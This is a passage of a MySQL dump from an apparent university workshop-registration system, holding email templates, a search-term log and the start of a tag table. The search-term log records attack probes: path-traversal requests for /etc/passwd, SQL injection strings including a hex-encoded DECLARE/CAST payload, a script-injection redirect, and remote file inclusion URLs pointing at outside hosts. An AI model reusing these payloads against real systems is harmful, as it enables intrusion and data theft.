(20, '[[studentEmail]]', 'classreg@ncsu.edu', 'OIT Workshop Registration Canceled', 'Dear [[studentFirstName]],\r\n\r\nYour reservation for the workshop "[[workshopName]]" scheduled for [[workshopDate]] has been canceled by the instructor.  If you have questions or comments please send OIT Workshops a note at classreg@ncsu.edu.\r\n\r\nThanks,\r\nTwanda  Baker\r\nOIT Training Coordinator\r\nclassreg@ncsu.edu\r\n\r\nTo return to OIT''s Classmate Registration System, click the underlined link below. If your email system does not support URL links, you can copy this link and paste it into your web browser.\r\n\r\nhttp://webapps.ncsu.edu/classmate'),
(21, '[[studentEmail]]', 'classreg@ncsu.edu', 'Signup Confirmation: [[workshopName]]', '[[studentFirstName]],\r\n\r\nYou have been signed up for the following workshop by its instructor:\r\n\r\n[[workshopName]]\r\n[[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\nInstructors:  [[instructorNames]] ([[instructorEmails]])\r\n\r\nThe minimum enrollment for this class is [[workshopMinimumEnrollment]].  If less than [[workshopMinimumEnrollment]] people sign up for this class, it may be canceled.  You will be notified via email if this happens.\r\n\r\nThank You\r\nOIT Education'),
(22, '[[studentEmail]]', 'classreg@ncsu.edu', 'Waitlist Confirmation:  [[workshopName]]', '[[studentFirstName]],\r\n\r\nYou have successfully been put on the waitlist by the instructor for the following workshop:\r\n\r\n[[workshopName]]\r\n[[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\nInstructors:  [[instructorNames]] ([[instructorEmails]])\r\n\r\nIf someone who is attending the workshop cancels, your position on the waitlist will automatically be updated.  If you get put into the class, you will be notified via email.\r\n\r\nThank You\r\nOIT Education'),
(23, '[[studentEmail]]', 'classreg@ncsu.edu', 'You have been put into the workshop [[workshopName]]', '[[studentFirstName]],\r\n\r\nWhen you signed up for "[[workshopName]]", you were put on the waitlist.  You have now been moved into the workshop by the instructor.\r\n\r\n[[workshopName]]\r\n[[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\nInstructors:  [[instructorNames]] ([[instructorEmails]])\r\n\r\nIf you need to cancel, you can.\r\n\r\nThank You\r\nOIT Education'),
(87, '[[studentEmail]]', 'classreg@ncsu.edu', 'OIT Workshops Confirmation: [[workshopName]]', 'Dear [[studentName]],\r\nThank you for booking an appointment with OIT Workshops. The details of your appointment are below:\r\n\r\nWorkshop: [[workshopName]]\r\nDate: [[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\nInstructors:  [[instructorNames]] ([[instructorEmails]])\r\n\r\nParticipants are expected to print and bring a copy of the workshop handouts to class. Workshop materials can be found by clicking the My Appointments link in our Classmate Registration system. If your workshop does not have a link for handsout, any materials for that particular workshop will be provided by the instructor at the time of the class. Thank you in advance for your co-operation.\r\n\r\nYou will receive a reminder prior to the workshop. If you are unable to attend this workshop, please use our online registration system to cancel the workshop from your schedule immediately so that others may register for your seat.\r\n\r\n\r\nNOTE:  If less than [[workshopMinimumEnrollment]] people register for this workshop it may be canceled.  In this event, you will be notified in advance by email.\r\n\r\n-- OIT Training Coordinator\r\nclassreg@ncsu.edu\r\n\r\nTo return to OIT''s Classmate Registration System, click the underlined link below. If your email system does not support URL links, you can copy this link and paste it into your web browser.\r\n\r\nhttp://webapps.ncsu.edu/classmate\r\n\r\nThank You'),
(88, '[[studentEmail]]', 'classreg@ncsu.edu', 'Waitlist Confirmation:  [[workshopName]]', 'Dear [[studentName]],\r\n\r\nYou have been placed on a waitlist for the following workshop:\r\n\r\n[[workshopName]]\r\n[[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\nInstructors:  [[instructorNames]] ([[instructorEmails]])\r\n\r\nYou are number [[waitlistPosition]] on the waitlist. Your position will automatically be updated as space becomes available.  If you are moved off of the list and into the class, you will be notified via email.\r\n\r\nThank You,\r\nTwanda Baker\r\nOIT Training Coordinator'),
(89, '[[instructorEmails]]', 'classreg@ncsu.edu', 'Instructor Signup Notification:  [[workshopName]]', '[[instructorNames]],\r\n\r\nThe following student has signed up for your workshop "[[workshopName]]" on [[workshopDate]]:\r\n\r\n[[studentName]]\r\n[[studentEmail]]\r\n\r\n\r\n\r\nThank You\r\nOIT Training Coordinator'),
(90, '[[studentEmail]]', 'classreg@ncsu.edu', 'OIT Workshops Cancellation: [[workshopName]]', 'Dear [[studentName]],\r\n\r\nYour reservation for the workshop "[[workshopName]]" scheduled for [[workshopDate]] has been canceled.  \r\n\r\nThanks,\r\nTwanda Baker\r\nOIT Training Coordinator\r\nclassreg@ncsu.edu\r\n\r\nTo return to OIT''s Classmate Registration System, click the underlined link below. If your email system does not support URL links, you can copy this link and paste it into your web browser.\r\n\r\nhttp://webapps.ncsu.edu/classmate'),
(91, '[[instructorEmails]]', 'classreg@ncsu.edu', 'Instructor Cancellation Notification:  [[workshopName]]', '[[instructorNames]],\r\n\r\nFYI - \r\nUser [[studentName]] canceled their reservation for [[workshopName]] scheduled for [[workshopDate]].\r\n\r\n\r\nTwanda Baker\r\nOIT Training Coordinator\r\nTwanda_Baker@ncsu.edu'),
(92, '[[studentEmail]]', 'classreg@ncsu.edu', 'OIT Workshops Confirmation: [[workshopName]]', 'Dear [[studentName]],\r\n\r\nYou have been moved off of the waitlist and onto the roll for the [[workshopName]] workshop. The details of your workshop registration are below:\r\n\r\n[[workshopName]]\r\n[[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\nInstructors:  [[instructorNames]] ([[instructorEmails]])\r\n\r\nParticipants are expected to print and bring a copy of the workshop handouts to class. Workshop materials can be found by clicking the My Appointments link in our Classmate Registration system. If your workshop does not have a link for handsout, any materials for that particular workshop will be provided by the instructor at the time of the class. Thank you in advance for your co-operation.\r\n\r\nYou will receive a reminder prior to the workshop. If you are unable to attend this workshop, please use our online registration system to cancel the workshop from your schedule immediately so that others may register for your seat.\r\n\r\n\r\nNOTE:  If less than [[workshopMinimumEnrollment]] people register for this workshop it may be canceled.  In this event, you will be notified in advance by email.\r\n\r\n-- OIT Training Coordinator\r\nclassreg@ncsu.edu\r\n\r\nTo return to OIT''s Classmate Registration System, click the underlined link below. If your email system does not support URL links, you can copy this link and paste it into your web browser.\r\n\r\nhttp://webapps.ncsu.edu/classmate\r\n\r\nThank You!'),
(93, '[[instructorEmails]]', 'classreg@ncsu.edu', 'Instructor Waitlist Advancement Notification:  [[workshopName]]', '[[instructorNames]],\r\n\r\nThe following student has been moved from the waitlist and onto the class role for "[[workshopName]]":\r\n\r\n[[studentName]]\r\n[[studentEmail]]\r\n\r\nThank You\r\nOIT Education'),
(94, '[[studentEmail]]', 'classreg@ncsu.edu', 'OIT Workshop Registration Canceled', 'Dear [[studentFirstName]],\r\n\r\nYour reservation for the workshop "[[workshopName]]" scheduled for [[workshopDate]] has been canceled by the instructor.  If you have questions or comments please send OIT Workshops a note at classreg@ncsu.edu.\r\n\r\nThanks,\r\nTwanda  Baker\r\nOIT Training Coordinator\r\nclassreg@ncsu.edu\r\n\r\nTo return to OIT''s Classmate Registration System, click the underlined link below. If your email system does not support URL links, you can copy this link and paste it into your web browser.\r\n\r\nhttp://webapps.ncsu.edu/classmate'),
(95, '[[studentEmail]]', 'classreg@ncsu.edu', 'Signup Confirmation: [[workshopName]]', '[[studentName]],\r\n\r\nYou have been signed up for the following workshop by its instructor:\r\n\r\n[[workshopName]]\r\n[[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\nInstructors:  [[instructorNames]] ([[instructorEmails]])\r\n\r\nThe minimum enrollment for this class is [[workshopMinimumEnrollment]].  If less than [[workshopMinimumEnrollment]] people sign up for this class, it may be canceled.  You will be notified via email if this happens.\r\n\r\nThank You\r\nOIT Education'),
(96, '[[studentEmail]]', 'classreg@ncsu.edu', 'Waitlist Confirmation:  [[workshopName]]', '[[studentName]],\r\n\r\nYou have successfully been put on the waitlist by the instructor for the following workshop:\r\n\r\n[[workshopName]]\r\n[[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\nInstructors:  [[instructorNames]] ([[instructorEmails]])\r\n\r\nYou are number [[waitlistPosition]] on the waitlist.  If someone who is attending the workshop cancels, your position will automatically be updated.  If you get put into the class, you will be notified via email.\r\n\r\nThank You\r\nOIT Education'),
(97, '[[studentEmail]]', 'classreg@ncsu.edu', 'You have been put into the workshop [[workshopName]]', '[[studentName]],\r\n\r\nWhen you signed up for "[[workshopName]]", you were put on the waitlist.  You have now been moved into the workshop by the instructor.\r\n\r\n[[workshopName]]\r\n[[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\nInstructors:  [[instructorNames]] ([[instructorEmails]])\r\n\r\nIf you need to cancel, you can.\r\n\r\nThank You\r\nOIT Education'),
(98, '[[instructorEmails]]', 'classreg@ncsu.edu', 'Instructor Waitlist Notification: [[workshopName]]', '[[instructorNames]],\r\n\r\nThe following registrant has been put on the waitlist for: [[workshopName]] on [[workshopDate]].\r\n\r\n[[studentName]]\r\n[[studentEmail]]\r\n\r\nThank You,\r\nTwanda Baker\r\nOIT Training Coordinator'),
(99, 'tjbaker@ncsu.edu', 'classreg@ncsu.edu', '[ClassMate Notification]', 'The following workshop has just been added to ClassMate.\r\nTitle:  [[title]] \r\nDescription:  [[description]]\r\nPre-reqs:  [[prerequisites]]'),
(100, '[[studentEmail]]', 'classreg@ncsu.edu', 'OIT Workshops [[workshopName]]', 'Dear [[studentName]],\r\n\r\nWe are excited to have you in our upcoming workshop:\r\n\r\nWorkshop: [[workshopName]]\r\nDate: [[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\nInstructors:  [[instructorNames]] ([[instructorEmails]])\r\n\r\n\r\nIf there are handouts available for this workshop, participants are expected to print and bring a copy to class. Please check the "Workshop Handous" section on the description page of this workshop. \r\n\r\nThank you in advance for your co-operation.\r\n\r\nTwanda Baker\r\nOIT Training Coordinator\r\nclassreg@ncsu.edu\r\n\r\n\r\nTo return to OIT''s Classmate Registration System, click the underlined link below. If your email system does not support URL links, you can copy this link and paste it into your web browser.\r\n\r\nhttp://webapps.ncsu.edu/classmate'),
(101, '[[studentEmail]]', 'classreg@ncsu.edu', 'OIT Workshop Reminder: [[workshopName]]', 'Dear [[studentName]],\r\n\r\nThis is a friendly reminder that you are signed up to attend the following workshop:\r\n\r\nWorkshop: [[workshopName]]\r\nDate: [[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\nInstructor(s):  [[instructorNames]] ([[instructorEmails]])\r\n\r\nIf you are unable to attend, please use the ClassMate registration system to cancel the workshop from your schedule immediately so that others may register for your seat.\r\n\r\nParticipants are expected to print and bring a copy of the workshop handouts to class, if applicable. Please check the "Workshop Handouts" section of workshop''s description page on ClassMate. Thank you in advance for your co-operation.\r\n\r\nWe look forward to seeing you!\r\n\r\nThanks,\r\nTwanda Baker\r\nOIT Training Coordinator\r\nclassreg@ncsu.edu\r\n\r\n\r\nTo return to OIT''s Classmate Registration System, click the underlined link below. If your email system does not support URL links, you can copy this link and paste it into your web browser.\r\n\r\nhttp://webapps.ncsu.edu/classmate'),
(102, '[[studentEmail]]', 'classreg@ncsu.edu', 'Evaluation Reminder:  [[workshopName]]', 'Dear [[studentName]],\r\n\r\nYour feedback is important to us. Please visit the our website and complete your evaluation of the following workshop:\r\n\r\nWorkshop: [[workshopName]]\r\nDate: [[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\nInstructors:  [[instructorNames]] ([[instructorEmails]])\r\n\r\n\r\nThank you!\r\nTwanda Baker\r\nOIT Training Coordinator\r\nclassreg@ncsu.edu\r\n\r\n\r\nTo return to OIT''s Classmate Registration System, click the underlined link below. If your email system does not support URL links, you can copy this link and paste it into your web browser.\r\n\r\nhttp://webapps.ncsu.edu/classmate'),
(103, '[[instructorEmails]]', 'classreg@ncsu.edu', 'Instructor Reminder:  You are teaching [[workshopName]]', 'Dear Instructors,\r\n\r\nThis is a friendly reminder that you are signed up to teach the following workshop:\r\n\r\nWorkshop: [[workshopName]]\r\nDate: [[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\n\r\nThere are currently [[workshopCurrentEnrollment]] students signed up to take your workshop.\r\n\r\nThanks\r\nOIT Education'),
(104, '[[instructorEmails]]', 'classreg@ncsu.edu', 'Instructor Reminder:  You are teaching [[workshopName]]', 'Dear Instructors,\r\n\r\nThis is a friendly reminder that you are signed up to teach the following workshop:\r\n\r\nWorkshop: [[workshopName]]\r\nDate: [[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\n\r\nThere are currently [[workshopCurrentEnrollment]] students signed up to take your workshop.\r\n\r\nThanks\r\nOIT Education'),
(105, '[[instructorEmails]], classreg@ncsu.edu, twanda_baker@ncsu.edu,gail_rankin@ncsu.edu', 'classreg@ncsu.edu', 'Low Attendance for [[workshopName]]', 'Dear Instructor(s),\r\n\r\nThe attendance for the following workshop is lower than the minimum requirement:\r\n\r\nWorkshop: [[workshopName]]\r\nDate: [[workshopDate]] from [[workshopStartTime]] to [[workshopEndTime]]\r\nLocation:  [[locationName]]  ([[locationAddress]])\r\n\r\nThere are currently [[workshopCurrentEnrollment]] of the required [[workshopMinimumEnrollment]] students signed up to take your workshop.\r\n\r\n\r\nThanks\r\nOIT Education');

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_search_term`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_search_term` (
  `term` varchar(255) NOT NULL DEFAULT '',
  `count` int(10) unsigned NOT NULL DEFAULT '0',
  `last` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`term`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `oit_tbl_search_term`
--

INSERT INTO `oit_tbl_search_term` (`term`, `count`, `last`) VALUES
('''php', 3, 1235516100),
('../../../../../../../../../../../../../../../../../../../../../../../etc/passwd', 1, 1237145152),
('../../../../../../../../etc/passwd', 1, 1240757851),
('10.5', 73, 1241219085),
('2007', 160, 1241802006),
('79', 1, 1229541831),
('Access', 364, 1263303238),
('access 2007', 3, 1240478007),
('access 4', 1, 1225481163),
('Accessibility', 56, 1241105807),
('Accessible', 55, 1241488194),
('accsess', 1, 1223914767),
('acrobat', 132, 1242099492),
('Active', 5, 1236928178),
('Active Directory', 81, 1242109190),
('Active Directory: OU Administration', 2, 1235238330),
('Active%20Directory', 1, 1236173857),
('ActiveDirectory', 1, 1237043907),
('AD', 1, 1227103718),
('admin', 2, 1220879422),
('administer', 1, 1220879428),
('administrative', 1, 1220879415),
('adminstudio', 1, 1212588898),
('admissionpros', 1, 1234796511),
('adobe', 122, 1242157011),
('adoe', 1, 1235516385),
('Advertisement', 40, 1241311743),
('alternatives', 61, 1241794548),
('analysis', 1, 1234155782),
('Antivirus', 53, 1242083184),
('API for Classmate', 1, 1223562795),
('Apple', 84, 1242073178),
('ar user', 1, 1241232824),
('ARUSER', 2, 1229742746),
('Assess', 1, 1224696944),
('Atlas.ti', 1, 1223913253),
('Authoring', 58, 1241319031),
('autocad', 2, 1231354089),
('autodesk', 1, 1234277299),
('beaudoin', 1, 1227127293),
('Brochure', 43, 1241566483),
('brochures', 2, 1240241337),
('brown bag', 1, 1234291204),
('brown bag lunch', 1, 1225999809),
('brown bags', 1, 1229531308),
('Calendar', 68, 1242193071),
('calendar mac', 1, 1240929926),
('campus crusade', 1, 1241443193),
('cancel appointment', 1, 1222975591),
('cards', 3, 1232658078),
('ccna', 1, 1232346772),
('cell', 2, 1236929222),
('cell phone', 45, 1242149591),
('cellphone', 3, 1237419439),
('class evaluation', 1, 1224257845),
('class schedule', 2, 1225116579),
('Classmate API', 1, 1223562783),
('clickers', 1, 1236193399),
('CMS', 61, 1241630340),
('coding', 1, 1226585669),
('Collage', 35, 1242002722),
('Computer', 1, 1222222893),
('Computer Use', 20, 1233976953),
('Computer Use Regulation', 1, 1220356803),
('Computer Use Regulation and Copyright Responsibilities', 1, 1220036707),
('Computer Use Regulation and Copyright Responsibilities  training workshop', 1, 1220119969),
('conficker', 25, 1241869617),
('Contribute', 111, 1241670331),
('cost', 1, 1233753986),
('creating web pages', 1, 1239906858),
('css', 2, 1227302099),
('css stylesheets', 1, 1227302094),
('CTU', 6, 1242201392),
('cut', 2, 1236929863),
('cut costs', 46, 1241469191),
('cutcosts', 3, 1237419128),
('Database', 159, 1242212919),
('demo', 1, 1240241502),
('deployment', 17, 1241305328),
('design', 25, 1241374650),
('Design Patterns', 335, 1263303237),
('Design%20Patterns', 27, 1236433572),
('Design%2520Patterns', 24, 1236433576),
('Design%252520Patterns', 24, 1236433582),
('Design%25252520Patterns', 16, 1236433584),
('Design%2525252520Patterns', 14, 1236433586),
('Design%252525252520Patterns', 13, 1232735546),
('Design%25252525252520Patterns', 8, 1225440298),
('Design%2525252525252520Patterns', 8, 1225440300),
('Design%252525252525252520Patterns', 6, 1225440302),
('Design%25252525252525252520Patterns', 6, 1225440303),
('Design%2525252525252525252520Patterns', 6, 1225440306),
('Design%252525252525252525252520Patterns', 3, 1225440308),
('Design%25252525252525252525252520Patterns', 3, 1225440309),
('Design%2525252525252525252525252520Patterns', 3, 1225440312),
('Design%252525252525252525252525252520Patterns', 3, 1225440314),
('Design%25252525252525252525252525252520Patterns', 3, 1225440317),
('Design%2525252525252525252525252525252520Patterns', 1, 1225440328),
('Design%252525252525252525252525252525252520Patterns', 1, 1225440329),
('Design%25252525252525252525252525252525252520Patterns', 1, 1225440331),
('Design%2525252525252525252525252525252525252520Patterns', 1, 1225440333),
('Design%252525252525252525252525252525252525252520Patterns', 1, 1225440335),
('DesignPatterns', 1, 1236825962),
('development', 25, 1242099762),
('digital', 2, 1236928492),
('digital tv', 46, 1241057468),
('digitaltv', 3, 1237419477),
('document file system', 1, 1223572941),
('document retention', 1, 1223572932),
('document scanning', 1, 1223572923),
('dreamweavaer', 1, 1242156354),
('dreamweaver', 16, 1242156363),
('Drupal', 62, 1241658470),
('DTV', 1, 1225999839),
('dummy', 1, 1241495634),
('ecl', 1, 1238771328),
('elements', 1, 1233606583),
('Elluminate', 1, 1233932577),
('Email', 30, 1242193495),
('emerging', 57, 1241126848),
('encription', 1, 1236786961),
('Encryption', 2, 1236787948),
('endnote', 1, 1224184235),
('ETSS Conference Room', 1, 1221511160),
('evaluation', 9, 1239887690),
('evaluation for workshop', 2, 1236976717),
('evaluation form', 1, 1239117643),
('evaluations', 3, 1235493867),
('exc el', 1, 1225124058),
('exce', 1, 1238771321),
('excel', 807, 1263306385),
('excel 2', 2, 1239285650),
('Excel 2007', 7, 1239044604),
('Excel 2007 Part 2', 1, 1233092416),
('Excel 2007 part 3', 2, 1240229388),
('Excel 3', 2, 1223907052),
('Excel class schedule', 4, 1225116549),
('excel classes 2009', 1, 1229013858),
('excel Part 2', 2, 1224507671),
('excel part 3', 1, 1233092456),
('Excel Part1', 1, 1224512322),
('Excel Part2', 1, 1224512374),
('Excel Part3', 1, 1224512417),
('Expel', 1, 1238771429),
('Expo', 63, 1241712054),
('facebook', 2, 1241182882),
('filemaker', 1, 1234535854),
('Fireworks', 80, 1241723581),
('Fireworks'';DECLARE @S CHAR(4000);SET @S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F62', 1, 1219856513),
('Fireworks;DECLARE @S CHAR(4000);SET @S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626', 1, 1219856513),
('flash', 2, 1234234192),
('free softwares', 1, 1236819537),
('front page', 2, 1226027318),
('grants', 1, 1240859247),
('Graphics', 65, 1242211696),
('greeting', 6, 1238107139),
('greeting cards', 50, 1241792098),
('greeting%20cards', 1, 1233205637),
('greetingcards', 1, 1236861323),
('Groupwise', 57, 1242200986),
('Gurganus', 1, 1234964646),
('handouts', 2, 1234188652),
('hdtv', 50, 1242001520),
('html', 8, 1241699550),
('http://65.247.182.200/c.gif?', 3, 1240756364),
('http://adieloliveira.xpg.com.br/scort.txt?', 1, 1238907061),
('http://angelsenterprises.com/picts/cmd?', 1, 1236057188),
('http://www.reiluke.site90.com/index.php?\0PHP', 1, 1236805718),
('http://www.reiluke.site90.com/index.php?', 2, 1235516103),
('iam', 1, 1242406273),
('illustrator', 1, 1231420150),
('Images', 63, 1242202059),
('indesign', 163, 1241764148),
('infopath', 1, 1227046279),
('inform', 4, 1242075346),
('installation', 15, 1240915330),
('instructor', 1, 1240373454),
('interface', 2, 1224636251),
('Introduction to Access', 2, 1237163188),
('Introduction to Access 2007 - Part 1', 1, 1237162820),
('introduction to excel', 1, 1234558512),
('introduction to Excel 200', 2, 1224507684),
('iphone', 50, 1241760987),
('IRCBots', 20, 1242131157),
('IT', 2, 1233760718),
('it staff', 1, 1241736090),
('IT Support', 21, 1242097768),
('itunes', 62, 1242072986),
('jacqueline hughes', 1, 1240856519),
('java', 3, 1240114313),
('JMP', 4, 1236194929),
('Kickstart', 69, 1242149782),
('kripesh', 2, 1238056696),
('L67iH3prq3lSBnUJ4FFufr5xXo', 1, 1209826033),
('lamp', 1, 1233760544),
('language', 1, 1226585660),
('learning style', 1, 1226891501),
('Linux', 88, 1242191737),
('location of scott', 3, 1238547722),
('lunch', 1, 1236717450),
('luz america calderon', 1, 1221358947),
('Mac', 23, 1242192699),
('mac leopard apple', 63, 1241623624),
('Mac OS', 1, 1212173792),
('macintosh', 61, 1242068856),
('macleopardapple', 3, 1237419302),
('Macromedia', 92, 1242144509),
('malware', 2, 1240933830),
('Mandatory', 18, 1239239593),
('map to scott hall', 1, 1231941258),
('maple', 1, 1240882473),
('mapping', 1, 1241535966),
('mapple', 1, 1240882477),
('mathematica', 1, 1224087129),
('matlab', 2, 1241908879),
('maya', 1, 1234277288),
('Microsoft', 247, 1242058930),
('microsoft project', 3, 1235670107),
('migration', 1, 1241736081),
('mobile', 1, 1241029652),
('modern', 1, 1240933825),
('moodle', 1, 1207937359),
('MS Access', 1, 1231278954),
('MS access 2007', 3, 1235009183),
('ms acess', 1, 1231336288),
('ms office', 3, 1238008896),
('MVC', 123, 1242074903),
('MyClassMate', 1, 1224018432),
('MySQL', 68, 1242180272),
('November 10', 1, 1223907802),
('Object', 23, 1241374621),
('Object Oriented Programming', 338, 1263306383),
('Object Oriented Programmingtest', 1, 1229412632),
('ObjectOrientedProgramming', 1, 1236825506),
('office', 192, 1263306386),
('Office 2007', 9, 1241203582),
('Office2007', 1, 1241659378),
('office2007.doc', 1, 1233868327),
('OfficeScan operating in connected mode.', 1, 1235371624),
('officw', 1, 1237209656),
('OIT', 3, 1222281136),
('OIT computer', 1, 1218053884),
('OIT Computer Use Regulation and  Copyright Responsibilities Training', 2, 1218228485),
('OIT STAFF', 29, 1239218126),
('online resource', 1, 1233168407),
('oop in php', 1, 1214976990),
('OS 10.5', 1, 1212176854),
('ou administration', 3, 1234974656),
('page', 122, 1241995026),
('part 12007', 1, 1239196811),
('paulinevc', 1, 1227816539),
('peoplesoft', 1, 1234210196),
('perl', 1, 1233760539),
('photo', 1, 1233690512),
('Photo shop', 1, 1233606409),
('photography', 102, 1242178390),
('photophop', 1, 1225727946),
('photoshop', 190, 1242762805),
('php', 527, 1242212046),
('php and 0=1 union select', 2, 1234414816),
('php and 1=1', 4, 1242131026),
('php and 1=2', 4, 1242131028),
('php And char(124)+(Select Cast(Count(1) as varchar(8000))+char(124) From [sysobjects] Where 1=1)0', 1, 1241587160),
('php and char(124)+user+char(124)=0', 4, 1242131020),
('php"self.location=String.fromCharCode(104,116,116,112,58,47,47,103,111,111,103,108,101,46,99,111,109);', 1, 1235516181),
('php'' and 1=1 and ''''=''', 4, 1242131029),
('php'' And char(124)+(Select Cast(Count(1) as varchar(8000))+char(124) From [sysobjects] Where 1=1)0 and ''''=''', 1, 1241587164),
('php'' and char(124)+user+char(124)=0 and ''%''=''', 4, 1242131022),
('php'' and char(124)+user+char(124)=0 and ''''=''', 5, 1242131016),
('PHP''and 1=1 and ''''=''', 1, 1216790060),
('PHP''and 1=2 and ''''=''', 1, 1216790062),
('php//amazon/index.php?lang=http://insequip.com//data/idfx1.txt??', 1, 1236120941),
('PHP//redirector.php?url=http://www.adriancrook.com/shiznaka.com/oldsite/404.txt\r??', 1, 1238162194),
('php//webapps.php/include/define.php?INC_DIR=http://dieter-schwaiger.de/downloads/id.txt\r??', 1, 1232317155),
('PHP/includes/search.php?GlobalSettings[templatesDirectory]=http://brimstoneradio.com/html/fx29id1.txt??', 1, 1240556876),
('PHP/includes/search.php?GlobalSettings[templatesDirectory]=http://driji.wap.sh/id.txt??', 1, 1242144434),
('PHP/includes/search.php?GlobalSettings[templatesDirectory]=http://eher-net.de/heibstyle/fx29id1.txt???', 1, 1235945676),
('php/includes/search.php?GlobalSettings[templatesDirectory]=http://gumansin.com/id.txt??', 1, 1235210326),
('PHP/includes/search.php?GlobalSettings[templatesDirectory]=http://www.mykr.net/bbs/data/id/copyright.txt??', 3, 1240559496),
('PHP/includes/search.php?GlobalSettings[templatesDirectory]=http://www.nw.or.kr/bbs/icon/idxx.txt??', 1, 1240638260),
('PHP/search.php?cutepath=http://www.fileden.com/files/2009/5/4/2429585/a.txt??', 1, 1241979220),
('php5', 252, 1242762733),
('podcasting', 68, 1242021522),
('portal', 1, 1231818548),
('power point', 1, 1234275675),
('PowerPoint', 123, 1242150864),
('powerpoint 2007', 3, 1225196755),
('Practical Encryption', 1, 1236609381),
('premier', 1, 1228138304),
('presentation', 83, 1241818343),
('Project', 2, 1235670540),
('Project I', 1, 1235670518),
('proposal', 1, 1240859268),
('publisher', 3, 1240928113),
('Publishing', 61, 1242057316),
('Realm', 6, 1236929881),
('Realm Linux', 76, 1241605673),
('RealmLinux', 1, 1237043918),
('Red', 3, 1236929860),
('Red Hat', 54, 1241328370),
('RedHat', 1, 1237044548),
('remedy', 76, 1241197780),
('remote', 14, 1242117518),
('Required', 23, 1239239594),
('requisition', 1, 1234779976),
('review', 1, 1226511875),
('REview form', 1, 1240489400),
('RHEL', 59, 1242149847),
('ris', 17, 1241761878),
('rootkits', 21, 1242121087),
('Ruby on Rails', 1, 1231257782),
('sar', 3, 1234388381),
('SAS', 5, 1241633746),
('Scientific Computing Solutions', 1, 1240604133),
('security', 2, 1226353648),
('server', 1, 1233760735),
('sign up', 1, 1227160205),
('Spreadsheet', 115, 1242085812),
('Spring', 2, 1222721705),
('spring workshops', 1, 1222721701),
('spss', 2, 1239418124),
('sql', 1, 1238787774),
('ssh', 1, 1207937353),
('suckmydick.php', 1, 1235516100),
('Suppport IT Staff WolfWise Migration Oracle Calendar Email', 40, 1242168937),
('Suppport IT Staff WolfWise Mobile Calendar Email', 16, 1242100591),
('survey', 4, 1239293845),
('T-Mobile', 53, 1242112777),
('tags', 1, 1226585875),
('technology', 51, 1242056320),
('test', 2, 1241958086),
('Tim Gurganus', 1, 1236609363),
('training for SAR', 1, 1223487746),
('transportation', 52, 1241794552),
('trend', 9, 1239814383),
('trend micro', 31, 1241869860),
('Trend Micro antivirus Admin', 3, 1241261922),
('Trend Micro antivirus administration management reports', 38, 1242215897),
('trendmicro', 3, 1237419308),
('turning point', 1, 1236193897),
('twitter', 5, 1240854624),
('typing', 2, 1235684223),
('unix', 1, 1237378877),
('video lectures embedded in course websites', 1, 1231005469),
('video production', 1, 1231005501),
('video weblink', 1, 1231005490),
('virus', 19, 1242036951),
('vista', 2, 1212683333),
('waledac', 20, 1242106173),
('Warner', 2, 1241039963),
('Warner Yuen', 18, 1242171095),
('wds', 18, 1242112042),
('wds windows deployment services installation configuration', 1, 1233840702),
('Web', 140, 1241688997),
('Web 2.0', 42, 1242150934),
('web page', 1, 1229979237),
('Web2.0', 3, 1237419296),
('Webi', 1, 1240499543),
('webpage', 1, 1231440228),
('website', 1, 1231440234),
('windows', 45, 1242192557),
('windows deployment services', 1, 1233838860),
('wolf wise', 2, 1241105375),
('WolfWise', 115, 1242194236),
('wolfwise training', 2, 1240933635),
('word', 88, 1241808483),
('word 2007', 1, 1238070198),
('word 2008', 1, 1238680573),
('workshop', 1, 1240241710),
('workshop handouts', 1, 1234368476),
('worm', 20, 1241780650),
('write', 2, 1240859352),
('xhtml', 2, 1241699414),
('year', 1, 1220879371),
('Yr8w3X3Fh0u4HE0DD4vwv', 1, 1209839802),
('zen', 1, 1240114377),
('zend', 1, 1236532349);

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_tag`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_tag` (
  `tagId` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(64) NOT NULL DEFAULT '',
  PRIMARY KEY (`tagId`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=235 ;

--
-- Dumping data for table `oit_tbl_tag`
--

INSERT INTO `oit_tbl_tag` (`tagId`, `name`) VALUES
(118, 'php'),
(119, 'php5'),
(120, 'Object Oriented Programming'),
(121, 'Design Patterns'),
